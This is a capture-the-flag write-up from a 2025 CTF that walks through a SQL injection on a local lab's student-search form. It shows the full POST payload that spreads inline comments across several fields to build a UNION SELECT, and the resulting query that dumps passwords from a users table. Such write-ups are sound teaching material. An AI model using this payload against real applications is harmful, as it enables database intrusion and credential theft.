---
title: "SQL Injection Tutorial: Inline Comment Multi-Parameter Bypass"
event: "STDiO CTF 2025"
category: "Web"
difficulty: "Medium"
solvedDate: 2025-03-15
tags: ["web", "sqli", "union-select", "comment-wrapping"]
isPublic: true
author: "AUKA"
summary: "Crafting a multi-parameter SQL injection across form inputs using inline SQL comments `/* ... */` to construct a UNION SELECT query."
dossier:
  targetIp: "localhost:1080"
  os: "Linux"
  arch: "x86_64"
  cve: "CWE-89 (SQL Injection)"
  services: ["HTTP / Web Application (Port 1080)"]
---

## Phase 1: HTTP Request Analysis & Form Inspection

The target application provides a student directory search form that sends a `POST` request with multiple query filter parameters: `id`, `fname`, `lname`, `class`, `grade`, and `order_by`.

```http
POST / HTTP/1.1
Host: localhost:1080
Content-Length: 106
Content-Type: application/x-www-form-urlencoded

id='/*&fname=*/)union/*&lname=*/select/*&class=*/1,1,1,/*&grade=*/1,pass/*&order_col=*/from&order_by=users
```

---

## Phase 2: Breaking the Query with Inline Comment Wrapping

Each form field is interpolated into a pre-defined backend query. By opening an inline comment `/*` in one field and closing it `*/` in the next field, we can comment out intermediate SQL clauses and insert arbitrary SQL keywords:

```sql
SELECT * FROM students WHERE (1=1
  AND id = ''/*'
  AND fname = '*/)union/*'
  AND lname = '*/select/*'
  AND class = '*/1,1,1,/*'
  AND grade = '*/1,pass/*'
)ORDER BY */from users
```

---

## Phase 3: Final UNION SELECT Execution & Data Extraction

When the inline comments are evaluated by the SQL engine, the query resolves into a clean UNION SELECT that dumps credentials directly from the `users` table:

```sql
SELECT * FROM students
WHERE (1=1 AND id = '')
UNION
SELECT 1, 1, 1, 1, pass
FROM users
```

Submitting this payload returns the user password column containing the flag.
